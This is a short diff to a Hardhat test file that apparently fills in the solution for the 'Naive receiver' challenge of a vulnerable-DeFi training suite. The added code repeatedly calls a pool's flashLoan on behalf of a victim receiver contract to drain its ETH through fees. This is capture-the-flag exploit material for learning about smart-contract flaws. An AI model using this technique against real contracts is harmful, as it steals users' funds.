@@ -37,7 +37,15 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const ETH = await pool.ETH();
+        let hack = await(await ethers.getContractFactory('HackFlashLoanReceiver', player)).deploy(await receiver.address);
+        await hack.deployed();
+        for(let i =0; i<10; i++){
+            await pool.flashLoan(receiver.address, ETH, ETHER_IN_RECEIVER, "0x")
+            console.log(await ethers.provider.getBalance(receiver.address))
+        }
+
+        
     });
 
     after(async function () {
